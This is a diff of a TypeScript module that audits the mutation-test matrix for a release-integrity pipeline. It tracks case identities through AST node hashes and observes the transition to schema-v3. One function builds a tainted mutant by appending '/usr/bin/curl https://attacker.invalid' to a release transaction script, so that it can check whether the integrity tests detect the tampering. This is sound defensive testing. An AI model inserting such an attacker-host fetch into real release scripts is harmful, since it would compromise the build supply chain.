@@ -3,6 +3,10 @@ import { createHash } from "node:crypto";
 import { readFileSync } from "node:fs";
 import { load } from "js-yaml";
 import ts from "typescript";
+import type {
+  ReleaseMutationTransitionPopulation,
+  ReleaseMutationTransitionProjection
+} from "./release-mutation-transition.js";
 
 type JsonPrimitive = boolean | null | number | string;
 type JsonValue = JsonPrimitive | readonly JsonValue[] | { readonly [key: string]: JsonValue };
@@ -233,6 +237,7 @@ interface DeclarativeMutationIdentity {
   readonly id: string;
   readonly mode: MutationMode;
   readonly needle: string;
+  readonly nodeSha256: string;
   readonly replacement: null | string;
   readonly replacementHandle: null | string;
   readonly sourceHandle: string;
@@ -241,6 +246,7 @@ interface DeclarativeMutationIdentity {
 
 interface DeclarativeCaseIdentity {
   readonly baselineHandle: string;
+  readonly caseNodeSha256: string;
   readonly checkCount: number;
   readonly companionHandle: null | string;
   readonly companionSlot: "integrity" | null | "release" | "run";
@@ -258,6 +264,15 @@ interface DeclarativeInvocationIdentity {
   readonly companionSlot: "integrity" | null | "release" | "run";
   readonly invocationKind: string;
   readonly mutantHandle: string;
+}
+
+interface TransitionObservedMutationSemantics {
+  readonly expectedOccurrences: number;
+  readonly mode: MutationMode;
+  readonly needle: string;
+  readonly replacement: string;
+  readonly replacementDependency: null | string;
+  readonly source: MutationSource;
 }
 
 type ReleaseOracleAdapterProperty =
@@ -2875,6 +2890,7 @@ function scanHybridDeclarativeMatrix(matrix: MatrixScan, problems: string[]): Hy
           mode,
           sourceHandle: sourceHandle.text,
           needle,
+          nodeSha256: sha256(mutationCall.getText(matrix.sourceFile)),
           replacement,
           replacementHandle,
           expectedOccurrences,
@@ -2950,6 +2966,7 @@ function scanHybridDeclarativeMatrix(matrix: MatrixScan, problems: string[]): Hy
         cases.push({
           id,
           handle: root.text,
+          caseNodeSha256: sha256(caseCall.getText(matrix.sourceFile)),
           invocationKind: invocation.invocationKind,
           baselineHandle: invocation.baselineHandle,
           companionHandle: invocation.companionHandle,
@@ -3168,30 +3185,6 @@ function scanHybridDeclarativeMatrix(matrix: MatrixScan, problems: string[]): Hy
   ) {
     problems.push("release mutation hybrid prelude must be the exact contiguous alias, plan, source sequence");
   }
-  const baselineAssertion = exactExpectMatcher(statements[aliasStatementIndex - 1], "toEqual");
-  const baselineDetector = baselineAssertion?.actual;
-  const baselineInput =
-    baselineDetector !== undefined && ts.isCallExpression(baselineDetector) ? baselineDetector.arguments[0] : undefined;
-  const exactBaselineAssertion =
-    baselineAssertion !== null &&
-    baselineDetector !== undefined &&
-    ts.isCallExpression(baselineDetector) &&
-    baselineDetector.questionDotToken === undefined &&
-    baselineDetector.typeArguments === undefined &&
-    ts.isIdentifier(baselineDetector.expression) &&
-    baselineDetector.expression.text === "mcpRegistryEvaluatorProblems" &&
-    baselineDetector.arguments.length === 1 &&
-    baselineInput !== undefined &&
-    ts.isPropertyAccessExpression(baselineInput) &&
-    baselineInput.questionDotToken === undefined &&
-    ts.isIdentifier(baselineInput.expression) &&
-    baselineInput.expression.text === "mcpbInputs" &&
-    baselineInput.name.text === "integrity" &&
-    ts.isArrayLiteralExpression(baselineAssertion.expected) &&
-    baselineAssertion.expected.elements.length === 0;
-  if (!exactBaselineAssertion) {
-    problems.push("release mutation hybrid prelude must start with one exact clean registry evaluator assertion");
-  }
   const exactMcpbInput = (value: ts.Expression | undefined, property: string): boolean =>
     value !== undefined &&
     ts.isPropertyAccessExpression(value) &&
@@ -3199,51 +3192,36 @@ function scanHybridDeclarativeMatrix(matrix: MatrixScan, problems: string[]): Hy
     ts.isIdentifier(value.expression) &&
     value.expression.text === "mcpbInputs" &&
     value.name.text === property;
-  const npmEvaluatorBaselineAssertion = exactExpectMatcher(statements[aliasStatementIndex - 2], "toEqual");
-  const npmEvaluatorBaselineDetector = npmEvaluatorBaselineAssertion?.actual;
-  const npmEvaluatorIntegrityInput =
-    npmEvaluatorBaselineDetector !== undefined && ts.isCallExpression(npmEvaluatorBaselineDetector)
-      ? npmEvaluatorBaselineDetector.arguments[0]
-      : undefined;
-  const exactNpmEvaluatorBaselineAssertion =
-    npmEvaluatorBaselineAssertion !== null &&
-    npmEvaluatorBaselineDetector !== undefined &&
-    ts.isCallExpression(npmEvaluatorBaselineDetector) &&
-    npmEvaluatorBaselineDetector.questionDotToken === undefined &&
-    npmEvaluatorBaselineDetector.typeArguments === undefined &&
-    ts.isIdentifier(npmEvaluatorBaselineDetector.expression) &&
-    npmEvaluatorBaselineDetector.expression.text === "npmProvenanceEvaluatorProblems" &&
-    npmEvaluatorBaselineDetector.arguments.length === 1 &&
-    exactMcpbInput(npmEvaluatorIntegrityInput, "integrity") &&
-    ts.isArrayLiteralExpression(npmEvaluatorBaselineAssertion.expected) &&
-    npmEvaluatorBaselineAssertion.expected.elements.length === 0;
-  if (!exactNpmEvaluatorBaselineAssertion) {
+  const exactCleanAssertionAt = (
+    statementIndex: number,
+    callee: string,
+    argumentProperties: readonly string[]
+  ): boolean => {
+    const assertion = exactExpectMatcher(statements[statementIndex], "toEqual");
+    const detector = assertion?.actual;
+    return (
+      assertion !== null &&
+      detector !== undefined &&
+      ts.isCallExpression(detector) &&
+      detector.questionDotToken === undefined &&
+      detector.typeArguments === undefined &&
+      ts.isIdentifier(detector.expression) &&
+      detector.expression.text === callee &&
+      detector.arguments.length === argumentProperties.length &&
+      argumentProperties.every((property, argumentIndex) =>
+        exactMcpbInput(detector.arguments[argumentIndex], property)
+      ) &&
+      ts.isArrayLiteralExpression(assertion.expected) &&
+      assertion.expected.elements.length === 0
+    );
+  };
+  if (!exactCleanAssertionAt(aliasStatementIndex - 1, "mcpRegistryEvaluatorProblems", ["integrity"])) {
+    problems.push("release mutation hybrid prelude must start with one exact clean registry evaluator assertion");
+  }
+  if (!exactCleanAssertionAt(aliasStatementIndex - 2, "npmProvenanceEvaluatorProblems", ["integrity"])) {
     problems.push("release mutation hybrid prelude must retain one exact clean npm provenance evaluator assertion");
   }
-  const npmBaselineAssertion = exactExpectMatcher(statements[aliasStatementIndex - 3], "toEqual");
-  const npmBaselineDetector = npmBaselineAssertion?.actual;
-  const npmReleaseInput =
-    npmBaselineDetector !== undefined && ts.isCallExpression(npmBaselineDetector)
-      ? npmBaselineDetector.arguments[0]
-      : undefined;
-  const npmIntegrityInput =
-    npmBaselineDetector !== undefined && ts.isCallExpression(npmBaselineDetector)
-      ? npmBaselineDetector.arguments[1]
-      : undefined;
-  const exactNpmBaselineAssertion =
-    npmBaselineAssertion !== null &&
-    npmBaselineDetector !== undefined &&
-    ts.isCallExpression(npmBaselineDetector) &&
-    npmBaselineDetector.questionDotToken === undefined &&
-    npmBaselineDetector.typeArguments === undefined &&
-    ts.isIdentifier(npmBaselineDetector.expression) &&
-    npmBaselineDetector.expression.text === "npmProvenanceContractProblems" &&
-    npmBaselineDetector.arguments.length === 2 &&
-    exactMcpbInput(npmReleaseInput, "release") &&
-    exactMcpbInput(npmIntegrityInput, "integrity") &&
-    ts.isArrayLiteralExpression(npmBaselineAssertion.expected) &&
-    npmBaselineAssertion.expected.elements.length === 0;
-  if (!exactNpmBaselineAssertion) {
+  if (!exactCleanAssertionAt(aliasStatementIndex - 3, "npmProvenanceContractProblems", ["release", "integrity"])) {
     problems.push("release mutation hybrid prelude must retain one exact clean npm provenance contract assertion");
   }
   const registryBaselineAssertion = exactExpectMatcher(statements[registrySourceStatementIndex - 1], "toEqual");
@@ -3882,7 +3860,7 @@ function resolveStaticString(
         new URL("../.github/scripts/release-mcpb-github-transaction.sh", import.meta.url),
         "utf8"
       );
-      return sha256(transaction.slice(0, -1));
+      return sha256(transaction);
     }
     if (active.has(expression.text)) return null;
     const initializer = declarations.get(expression.text);
@@ -3974,12 +3952,14 @@ function registryRunIdentity(workflow: string): string | null {
   }
   const document = yamlRecord(loaded);
   const jobs = yamlRecord(document?.jobs);
-  const publish = yamlRecord(jobs?.publish);
-  const steps = publish?.steps;
+  const registry = yamlRecord(jobs?.mcp_registry);
+  const steps = registry?.steps;
   if (!Array.isArray(steps)) return null;
   for (const stepValue of steps) {
     const step = yamlRecord(stepValue);
-    if (step?.name === "Publish to MCP Registry (stable only)" && typeof step.run === "string") return step.run;
+    if (step?.name === "Publish exact stable manifest to MCP Registry with OIDC" && typeof step.run === "string") {
+      return step.run;
+    }
   }
   return null;
 }
@@ -7139,6 +7119,41 @@ function matcherCallsByNodeSha(matrix: MatrixScan): ReadonlyMap<string, readonly
   return calls;
 }
 
+function transitionCaseNodesBySha(matrix: MatrixScan): ReadonlyMap<string, readonly ts.Node[]> {
+  const nodes = new Map<string, ts.Node[]>();
+  const visit = (node: ts.Node): void => {
+    if (
+      (ts.isCallExpression(node) || ts.isForOfStatement(node) || ts.isForStatement(node)) &&
+      node.getStart(matrix.sourceFile) >= matrix.matrixStart &&
+      node.end <= matrix.callback.body.end
+    ) {
+      const hash = sha256(node.getText(matrix.sourceFile));
+      const entries = nodes.get(hash) ?? [];
+      entries.push(node);
+      nodes.set(hash, entries);
+    }
+    ts.forEachChild(node, visit);
+  };
+  visit(matrix.callback.body);
+  return nodes;
+}
+
+function transitionMatcherCalls(node: ts.Node): readonly ts.CallExpression[] {
+  const matchers: ts.CallExpression[] = [];
+  const visit = (candidate: ts.Node): void => {
+    if (
+      ts.isCallExpression(candidate) &&
+      ts.isPropertyAccessExpression(candidate.expression) &&
+      ["toBe", "toContain", "toContainEqual", "toEqual"].includes(candidate.expression.name.text)
+    ) {
+      matchers.push(candidate);
+    }
+    ts.forEachChild(candidate, visit);
+  };
+  visit(node);
+  return matchers;
+}
+
 function expectedPhysicalMatcherCountsByHash(
   ownerships: Iterable<FrozenMatcherSpanOwnership>
 ): ReadonlyMap<string, number> {
@@ -7907,6 +7922,89 @@ function validateRemainingLegacyMatchers(
         `release mutation hybrid matcher ${hash} physical multiplicity must equal ${expected} ` +
           `distinct remaining frozen assertion span(s); found ${actual}`
       );
+    }
+  }
+  validateSharedLegacyPrimaryTopologies(manifest, matrix, executionAnchors, bindingGraph, problems);
+  return executionAnchors;
+}
+
+function validateTransitionUnchangedLegacyMatchers(
+  manifest: IdentityManifest,
+  matrix: MatrixScan,
+  legacyById: ReadonlyMap<string, LegacyMutationCall>,
+  unchangedOldIds: ReadonlySet<string>,
+  problems: string[]
+): ReadonlyMap<string, LegacyCaseExecutionAnchor> {
+  const callsByHash = matcherCallsByNodeSha(matrix);
+  const bindingGraph = variableBindingFlows(matrix.sourceFile);
+  const executionAnchors = new Map<string, LegacyCaseExecutionAnchor>();
+  for (const identityCase of manifest.cases) {
+    if (MIGRATED_DECLARATIVE_ID_SET.has(identityCase.root)) continue;
+    const unchangedCase = unchangedOldIds.has(identityCase.root);
+    const rootCall = legacyById.get(identityCase.root)?.node;
+    if (rootCall === undefined) {
+      if (unchangedCase) problems.push(`current unchanged legacy case ${identityCase.id} has no exact root call`);
+      continue;
+    }
+    let exactCaseMatchers = true;
+    let primaryMatcher: ts.CallExpression | undefined;
+    for (let checkIndex = 0; checkIndex < identityCase.checks.length; checkIndex++) {
+      const check = identityCase.checks[checkIndex];
+      if (check === undefined) continue;
+      const matched: ts.CallExpression[] = [];
+      let previousStart = -1;
+      for (let matcherIndex = 0; matcherIndex < check.matcherEvaluations.length; matcherIndex++) {
+        const matcher = check.matcherEvaluations[matcherIndex];
+        if (matcher === undefined) continue;
+        const candidates = (callsByHash.get(matcher.assertionSpan.sha256) ?? []).filter(
+          (candidate) =>
+            candidate.getStart(matrix.sourceFile) > previousStart &&
+            rootBoundToCurrentMatcher(rootCall, candidate, matrix.sourceFile, bindingGraph)
+        );
+        if (candidates.length !== 1) {
+          exactCaseMatchers = false;
+          if (unchangedCase) {
+            problems.push(
+              `current unchanged legacy case ${identityCase.id} check ${checkIndex} leaf ${matcherIndex} ` +
+                `must have one exact node-text/root-bound matcher; found ${candidates.length}`
+            );
+          }
+          continue;
+        }
+        const candidate = candidates[0];
+        if (candidate !== undefined) {
+          if (checkIndex === 0 && matcherIndex === 0) primaryMatcher = candidate;
+          matched.push(candidate);
+          previousStart = candidate.getStart(matrix.sourceFile);
+        }
+      }
+      const firstMatcher = matched[0];
+      const lastMatcher = matched.at(-1);
+      if (
+        matched.length === check.matcherEvaluations.length &&
+        firstMatcher !== undefined &&
+        lastMatcher !== undefined
+      ) {
+        const currentCheckHash = sha256(
+          matrix.sourceFile.text.slice(firstMatcher.getStart(matrix.sourceFile), lastMatcher.end)
+        );
+        if (currentCheckHash !== check.assertionSpan.sha256) {
+          exactCaseMatchers = false;
+          if (unchangedCase) {
+            problems.push(`current unchanged legacy case ${identityCase.id} check ${checkIndex} range drifted`);
+          }
+        }
+      } else {
+        exactCaseMatchers = false;
+      }
+    }
+    if (exactCaseMatchers && primaryMatcher !== undefined) {
+      executionAnchors.set(identityCase.id, {
+        anchor: primaryMatcher.getStart(matrix.sourceFile),
+        matcher: primaryMatcher,
+        rootAnchor: rootCall.getStart(matrix.sourceFile),
+        rootCall
+      });
     }
   }
   validateSharedLegacyPrimaryTopologies(manifest, matrix, executionAnchors, bindingGraph, problems);
@@ -9028,4 +9126,1482 @@ export function releaseMutationExactLegacyIdentityAuditProblems(
  */
 export function releaseMutationIdentityAuditProblems(matrixSource: string, manifestSource: string): string[] {
   return createReleaseMutationIdentityAuditor(manifestSource).auditMatrix(matrixSource);
+}
+
+/** Classification inputs needed to observe one schema-v3 transition population. */
+export interface ReleaseMutationTransitionObservationPlan {
+  readonly currentMcpbInputs: readonly {
+    readonly expression: string;
+    readonly property: string;
+    readonly sourceId: string;
+  }[];
+  readonly expectedIdentityCount: number;
+  readonly expectedLegacyCount: number;
+  readonly expectedSourceCount: number;
+  readonly newIdentities: readonly {
+    readonly afterOldId: string;
+    readonly caseNodeSha256: string;
+    readonly caseTemplateOldId: string;
+    readonly expectedOccurrences: number;
+    readonly id: string;
+    readonly logicalProjectionSha256: string;
+    readonly mode: MutationMode;
+    readonly nodeSha256: string;
+    readonly ownerId: string;
+    readonly problem: string;
+    readonly role: MutationRole;
+    readonly sourceId: string;
+    readonly witnessAfter: number;
+    readonly witnessBefore: number;
+    readonly valueDerivation?: {
+      readonly fixtureBinding: string;
+      readonly fixturePath: string;
+      readonly fixtureProperty: string;
+      readonly hashInitializerSha256: string;
+      readonly kind: "tainted-release-transaction-sha256";
+      readonly taintedInitializerSha256: string;
+      readonly transactionPath: string;
+    };
+  }[];
+  readonly newSources: readonly {
+    readonly binding: string;
+    readonly declaration?: string;
+    readonly id: string;
+    readonly inputProperty?: string;
+    readonly kind: "constant" | "file";
+    readonly legacyExpression: string;
+    readonly path?: string;
+    readonly readExpression?: string;
+  }[];
+  readonly retiredSourceIds: readonly string[];
+  readonly successors: readonly {
+    readonly caseNodeSha256: string;
+    readonly logicalProjectionSha256: string;
+    readonly newId: string;
+    readonly nodeSha256: string;
+    readonly oldId: string;
+  }[];
+  readonly unchangedOldIds: readonly string[];
+}
+
+/** Complete observed populations and frozen-current matrix witnesses for the transition audit. */
+export interface ReleaseMutationTransitionPopulationObservation {
+  readonly current: ReleaseMutationTransitionPopulation | null;
+  readonly declarativeCount: number;
+  readonly historical: ReleaseMutationTransitionPopulation | null;
+  readonly legacyCount: number;
+  readonly matrixSliceSha256: null | string;
+  readonly problems: readonly string[];
+  readonly sourceSha256: string;
+}
+
+function transitionCaseProjection(identityCase: CaseIdentity): JsonValue {
+  return {
+    id: identityCase.id,
+    root: identityCase.root,
+    checks: identityCase.checks.map((check) => ({
+      invoke: {
+        kind: check.invoke.kind,
+        baseline: check.invoke.baseline,
+        mutant: check.invoke.mutant
+      },
+      expectation: check.expectation,
+      matcherEvaluations: check.matcherEvaluations.map((matcher) => ({
+        matcher: matcher.matcher,
+        negated: matcher.negated,
+        operand: {
+          raw: JSON.stringify(matcher.operand.resolved),
+          resolved: matcher.operand.resolved
+        }
+      }))
+    }))
+  };
+}
+
+function transitionSourceProjection(source: SourceIdentity): ReleaseMutationTransitionProjection {
+  return {
+    id: source.id,
+    legacyExpressions: source.legacyExpressions,
+    declarativeBinding: source.declarativeBinding,
+    origin: source.origin,
+    contentSha256: source.contentSha256
+  };
+}
+
+function transitionIdentityProjection(
+  mutation: MutationIdentity,
+  ownerCase: CaseIdentity
+): ReleaseMutationTransitionProjection {
+  return {
+    id: mutation.id,
+    mode: mutation.mode,
+    role: mutation.role,
+    source: mutation.source,
+    replacementDependency: mutation.replacementDependency,
+    ownerRoot: mutation.ownerRoot,
+    legacyOccurrence: mutation.legacyOccurrence,
+    expressions: mutation.expressions,
+    witness: {
+      kind: mutation.witness.kind,
+      anchor: mutation.witness.anchor,
+      before: mutation.witness.before,
+      after: mutation.witness.after,
+      derivation: mutation.witness.derivation
+    },
+    ownerCase: transitionCaseProjection(ownerCase)
+  };
+}
+
+function transitionCurrentIdentityProjection(
+  historical: MutationIdentity,
+  ownerCase: JsonValue,
+  current: {
+    readonly expectedOccurrences: number;
+    readonly expectedOccurrencesExpression: string;
+    readonly mode: MutationMode;
+    readonly needle: string;
+    readonly needleExpression: string;
+    readonly ownerRoot: string;
+    readonly replacement: string;
+    readonly replacementDependency: null | string;
+    readonly replacementExpression: string;
+    readonly role: MutationRole;
+    readonly source: MutationSource;
+    readonly sourceExpression: string;
+    readonly witness: Pick<MutationWitness, "after" | "anchor" | "before" | "derivation" | "kind">;
+  },
+  id: string
+): ReleaseMutationTransitionProjection {
+  return {
+    id,
+    mode: current.mode,
+    role: current.role,
+    source: current.source,
+    replacementDependency: current.replacementDependency,
+    ownerRoot: current.ownerRoot,
+    // These two fields are schema-v2 representation provenance, not current executable semantics.
+    // Keeping them normalized to the immutable row lets legacy and declarative representations
+    // compare in one projection while every executable value below comes from the current AST.
+    legacyOccurrence: historical.legacyOccurrence,
+    expressions: {
+      source: { raw: current.sourceExpression, resolved: current.source.id },
+      needle: { raw: current.needleExpression, resolved: current.needle },
+      replacement: { raw: current.replacementExpression, resolved: current.replacement },
+      expectedOccurrences: {
+        raw: current.expectedOccurrencesExpression,
+        resolved: current.expectedOccurrences
+      }
+    },
+    witness: {
+      kind: current.witness.kind,
+      anchor: current.witness.anchor,
+      before: current.witness.before,
+      after: current.witness.after,
+      derivation: current.witness.derivation
+    },
+    ownerCase
+  };
+}
+
+function deriveTransitionWitness(
+  source: string,
+  mutant: string,
+  needle: string,
+  replacement: string
+): Pick<MutationWitness, "after" | "anchor" | "before" | "derivation" | "kind"> | null {
+  const candidates: Array<{
+    readonly anchor: string;
+    readonly derivation: MutationWitness["derivation"];
+    readonly kind: MutationWitness["kind"];
+  }> = [];
+  if (needle.length > 0 && needle.length <= 512) {
+    candidates.push({ kind: "token", anchor: needle, derivation: "needle" });
+  } else if (needle.length > 0) {
+    candidates.push(
+      { kind: "token", anchor: needle.slice(0, 512), derivation: "token-delta" },
+      { kind: "token", anchor: needle.slice(-512), derivation: "token-delta" }
+    );
+  }
+  if (replacement.length > 0 && replacement.length <= 512) {
+    candidates.push({ kind: "token", anchor: replacement, derivation: "replacement" });
+  } else if (replacement.length > 0) {
+    candidates.push(
+      { kind: "token", anchor: replacement.slice(0, 512), derivation: "token-delta" },
+      { kind: "token", anchor: replacement.slice(-512), derivation: "token-delta" }
+    );
+  }
+  for (const changed of [needle, replacement]) {
+    const lines = changed.split("\n");
+    for (const width of [2, 3, 4]) {
+      for (let start = 0; start < Math.max(0, lines.length - width + 1); start++) {
+        const fragment = lines.slice(start, start + width).join("\n");
+        if (fragment.length > 0 && fragment.length <= 512) {
+          candidates.push({ kind: "token", anchor: fragment, derivation: "token-delta" });
+        }
+      }
+    }
+  }
+  const seenLines = new Set<string>();
+  for (const line of [...mutant.split("\n"), ...source.split("\n")]) {
+    if (line !== "" && line.length <= 512 && !seenLines.has(line)) {
+      seenLines.add(line);
+      candidates.push({ kind: "line", anchor: line, derivation: "line-delta" });
+    }
+  }
+  const seenTokens = new Set<string>();
+  for (const token of `${replacement}\n${needle}`.match(/[\p{L}\p{N}_]+/gu) ?? []) {
+    if (token.length <= 128 && !seenTokens.has(token)) {
+      seenTokens.add(token);
+      candidates.push({ kind: "token", anchor: token, derivation: "token-delta" });
+    }
+  }
+  for (const candidate of candidates) {
+    const witnessShape: MutationWitness = {
+      ...candidate,
+      before: 0,
+      after: 0,
+      sourceSha256: "0".repeat(64),
+      mutantSha256: "0".repeat(64)
+    };
+    const before = witnessCount(source, witnessShape);
+    const after = witnessCount(mutant, witnessShape);
+    if (before !== after) return { ...candidate, before, after };
+  }
+  return null;
+}
+
+function transitionLogicalProjectionSha256(
+  mode: MutationMode,
+  sourceId: string,
+  role: MutationRole,
+  ownerId: string,
+  needle: string,
+  replacement: string,
+  expectedOccurrences: number
+): string {
+  return sha256(JSON.stringify({ mode, sourceId, role, ownerId, needle, replacement, expectedOccurrences }));
+}
+
+function transitionDeclarativeOwnerCaseProjection(
+  observed: DeclarativeCaseIdentity,
+  historical: CaseIdentity,
+  ownerRoot: string,
+  idByHandle: ReadonlyMap<string, string>,
+  problems: string[]
+): JsonValue {
+  const historicalCheck = historical.checks[0];
+  const baseline = idByHandle.get(observed.baselineHandle);
+  const mutant = idByHandle.get(observed.mutantHandle);
+  const companion = observed.companionHandle === null ? null : (idByHandle.get(observed.companionHandle) ?? null);
+  const historicalArguments = historicalCheck?.invoke.inputs.arguments;
+  const historicalCompanion = Array.isArray(historicalArguments)
+    ? historicalArguments.find(
+        (value): value is Readonly<Record<string, JsonValue>> =>
+          value !== null &&
+          typeof value === "object" &&
+          !Array.isArray(value) &&
+          value.kind === "source" &&
+          typeof value.id === "string"
+      )
+    : undefined;
+  const expectedCompanionId =
+    historicalCompanion !== undefined && typeof historicalCompanion.id === "string" ? historicalCompanion.id : null;
+  const expectedCompanionSlot =
+    historicalCompanion !== undefined && typeof historicalCompanion.slot === "string" ? historicalCompanion.slot : null;
+  if (
+    historicalCheck === undefined ||
+    baseline === undefined ||
+    mutant === undefined ||
+    observed.checkCount !== 1 ||
+    observed.companionSlot !== expectedCompanionSlot ||
+    companion !== expectedCompanionId
+  ) {
+    problems.push(`current declarative owner case ${observed.id} has an unresolved exact logical projection`);
+  }
+  return remapTransitionValue(
+    {
+      id: observed.id,
+      root: ownerRoot,
+      checks: [
+        {
+          invoke: {
+            kind: observed.invocationKind,
+            baseline: baseline ?? `<unresolved:${observed.baselineHandle}>`,
+            mutant: mutant ?? `<unresolved:${observed.mutantHandle}>`
+          },
+          expectation: {
+            id: observed.expectationId,
+            kind: "problem",
+            problem: observed.problem
+          },
+          matcherEvaluations: [
+            {
+              matcher: "toContain",
+              negated: false,
+              operand: {
+                raw: JSON.stringify(observed.problem),
+                resolved: observed.problem
+              }
+            }
+          ]
+        }
+      ]
+    },
+    historical.root,
+    ownerRoot
+  );
+}
+
+function remapTransitionValue(value: JsonValue, oldRootId: string, newRootId: string): JsonValue {
+  if (Array.isArray(value)) return value.map((entry) => remapTransitionValue(entry, oldRootId, newRootId));
+  if (value !== null && typeof value === "object") {
+    return Object.fromEntries(
+      Object.entries(value).map(([key, entry]) => [key, remapTransitionValue(entry, oldRootId, newRootId)])
+    );
+  }
+  if (typeof value !== "string") return value;
+  if (value === oldRootId) return newRootId;
+  const oldSuffix = oldRootId.slice("release.".length);
+  const newSuffix = newRootId.slice("release.".length);
+  if (value === `release.case.${oldSuffix}`) return `release.case.${newSuffix}`;
+  if (value.startsWith(`release.expectation.${oldSuffix}.`)) {
+    return `release.expectation.${newSuffix}.${value.slice(`release.expectation.${oldSuffix}.`.length)}`;
+  }
+  return value;
+}
+
+function transitionNewIdentityCaseProjection(
+  template: JsonValue,
+  entry: ReleaseMutationTransitionObservationPlan["newIdentities"][number],
+  ownerId: string,
+  problems: string[]
+): JsonValue {
+  const remapped = remapTransitionValue(template, entry.caseTemplateOldId, ownerId);
+  if (remapped === null || typeof remapped !== "object" || Array.isArray(remapped)) {
+    problems.push(`transition new identity ${entry.id} has no object case template`);
+    return remapped;
+  }
+  const checks = remapped.checks;
+  const firstCheck = Array.isArray(checks) ? checks[0] : undefined;
+  if (firstCheck === null || typeof firstCheck !== "object" || Array.isArray(firstCheck)) {
+    problems.push(`transition new identity ${entry.id} has no template check`);
+    return remapped;
+  }
+  const expectation = firstCheck.expectation;
+  const matchers = firstCheck.matcherEvaluations;
+  const firstMatcher = Array.isArray(matchers) ? matchers[0] : undefined;
+  if (
+    expectation === null ||
+    typeof expectation !== "object" ||
+    Array.isArray(expectation) ||
+    firstMatcher === null ||
+    typeof firstMatcher !== "object" ||
+    Array.isArray(firstMatcher)
+  ) {
+    problems.push(`transition new identity ${entry.id} has no mutable expectation template`);
+    return remapped;
+  }
+  return {
+    ...remapped,
+    checks: [
+      {
+        ...firstCheck,
+        expectation: { ...expectation, problem: entry.problem },
+        matcherEvaluations: [
+          {
+            ...firstMatcher,
+            operand: { raw: JSON.stringify(entry.problem), resolved: entry.problem }
+          },
+          ...(Array.isArray(matchers) ? matchers.slice(1) : [])
+        ]
+      },
+      ...checks.slice(1)
+    ]
+  };
+}
+
+function exactObjectFreezeStringProperty(
+  source: string,
+  binding: string,
+  propertyName: string,
+  path: string,
+  problems: string[]
+): string | null {
+  const sourceFile = ts.createSourceFile(path, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
+  const values: string[] = [];
+  for (const statement of sourceFile.statements) {
+    if (!ts.isVariableStatement(statement)) continue;
+    for (const declaration of statement.declarationList.declarations) {
+      if (!ts.isIdentifier(declaration.name) || declaration.name.text !== binding) continue;
+      const initializer = declaration.initializer;
+      const object =
+        initializer !== undefined &&
+        ts.isCallExpression(initializer) &&
+        initializer.arguments.length === 1 &&
+        ts.isPropertyAccessExpression(initializer.expression) &&
+        ts.isIdentifier(initializer.expression.expression) &&
+        initializer.expression.expression.text === "Object" &&
+        initializer.expression.name.text === "freeze" &&
+        initializer.arguments[0] !== undefined &&
+        ts.isObjectLiteralExpression(initializer.arguments[0])
+          ? initializer.arguments[0]
+          : null;
+      if (object === null) continue;
+      for (const property of object.properties) {
+        if (
+          ts.isPropertyAssignment(property) &&
+          (ts.isIdentifier(property.name) || ts.isStringLiteral(property.name)) &&
+          property.name.text === propertyName &&
+          (ts.isStringLiteral(property.initializer) || ts.isNoSubstitutionTemplateLiteral(property.initializer))
+        ) {
+          values.push(property.initializer.text);
+        }
+      }
+    }
+  }
+  if (values.length !== 1) {
+    problems.push(`transition derivation ${path} must expose one exact ${binding}.${propertyName} string`);
+    return null;
+  }
+  return values[0] ?? null;
+}
+
+function newIdentityLogicalValues(
+  entry: ReleaseMutationTransitionObservationPlan["newIdentities"][number],
+  call: {
+    readonly needle: null | string;
+    readonly replacement: null | string;
+  },
+  matrix: MatrixScan,
+  problems: string[]
+): null | { readonly needle: string; readonly replacement: string } {
+  if (entry.valueDerivation === undefined) {
+    if (call.needle === null || call.replacement === null) {
+      problems.push(`current new identity ${entry.id} has an unresolved logical value without a derivation`);
+      return null;
+    }
+    return { needle: call.needle, replacement: call.replacement };
+  }
+  const derivation = entry.valueDerivation;
+  const taintedInitializer = matrix.declarations.get("taintedTransaction");
+  const hashInitializer = matrix.declarations.get("taintedTransactionHash");
+  if (
+    taintedInitializer === undefined ||
+    hashInitializer === undefined ||
+    sha256(taintedInitializer.getText(matrix.sourceFile)) !== derivation.taintedInitializerSha256 ||
+    sha256(hashInitializer.getText(matrix.sourceFile)) !== derivation.hashInitializerSha256
+  ) {
+    problems.push(`current new identity ${entry.id} has an unreviewed tainted-transaction derivation`);
+    return null;
+  }
+  let transaction: string;
+  let fixtureSource: string;
+  try {
+    transaction = readFileSync(new URL(`../${derivation.transactionPath}`, import.meta.url), "utf8");
+    fixtureSource = readFileSync(new URL(`../${derivation.fixturePath}`, import.meta.url), "utf8");
+  } catch (error: unknown) {
+    problems.push(`current new identity ${entry.id} derivation source could not be read: ${String(error)}`);
+    return null;
+  }
+  if (!transaction.endsWith("\n")) {
+    problems.push(`current new identity ${entry.id} transaction derivation requires one terminal newline`);
+    return null;
+  }
+  const needle = sha256(transaction);
+  const fixtureNeedle = exactObjectFreezeStringProperty(
+    fixtureSource,
+    derivation.fixtureBinding,
+    derivation.fixtureProperty,
+    derivation.fixturePath,
+    problems
+  );
+  if (fixtureNeedle !== needle) {
+    problems.push(`current new identity ${entry.id} imported transaction digest disagrees with exact source bytes`);
+    return null;
+  }
+  const taintedTransaction = `${transaction.slice(0, -1)}\n/usr/bin/curl https://attacker.invalid\n`;
+  return { needle, replacement: sha256(taintedTransaction) };
+}
+
+/**
+ * Independently observes historical and current populations consumed by the schema-v3 audit.
+ *
+ * Current successor and new-root projections come from the AST observation. Same-ID historical
+ * projections remain representation-neutral across legacy-to-declarative migration and are also
+ * protected by the frozen complete-source and balanced-matrix witnesses returned here.
+ *
+ * @param matrixSource - Complete current release-integrity test source.
+ * @param manifestSource - Byte-exact historical schema-v2 fixture.
+ * @param historicalFixtureSha256 - Reviewed historical fixture digest.
+ * @param plan - Exhaustive reviewed transition classification.
+ * @returns Observed populations, counts, digests and stable diagnostics.
+ */
+export function observeReleaseMutationTransitionPopulation(
+  matrixSource: string,
+  manifestSource: string,
+  historicalFixtureSha256: string,
+  plan: ReleaseMutationTransitionObservationPlan
+): ReleaseMutationTransitionPopulationObservation {
+  const problems: string[] = [];
+  const manifest = parseManifest(manifestSource, problems);
+  const matrixObservation = observeReleaseMutationTransitionMatrix(matrixSource);
+  problems.push(...matrixObservation.problems);
+  const projectionMatrixProblems: string[] = [];
+  const projectionMatrix = scanMatrix(matrixSource, projectionMatrixProblems);
+  problems.push(...projectionMatrixProblems);
+  const declarativeProjection =
+    projectionMatrix === null
+      ? { cases: Object.freeze([]), executionEvents: Object.freeze([]), mutations: Object.freeze([]) }
+      : scanHybridDeclarativeMatrix(projectionMatrix, problems);
